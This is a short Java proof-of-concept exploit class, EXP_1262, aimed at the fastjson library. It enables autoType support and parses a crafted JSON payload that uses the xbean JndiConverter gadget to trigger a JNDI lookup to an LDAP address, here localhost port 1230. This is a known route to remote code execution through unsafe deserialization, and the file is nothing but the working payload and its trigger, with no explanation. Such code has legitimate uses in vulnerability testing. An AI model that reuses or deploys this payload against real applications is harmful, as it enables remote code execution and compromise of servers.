import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.parser.ParserConfig;
import org.apache.xbean.propertyeditor.JndiConverter;

public class EXP_1262 {
    public static void main(String[] args) {
        ParserConfig.getGlobalInstance().setAutoTypeSupport(true);
        String poc = "{\"@type\":\"org.apache.xbean.propertyeditor.JndiConverter\"," +
                "\"AsText\":\"ldap://127.0.0.1:1230/ExportObject\"}";
        JSON.parse(poc);
    }
}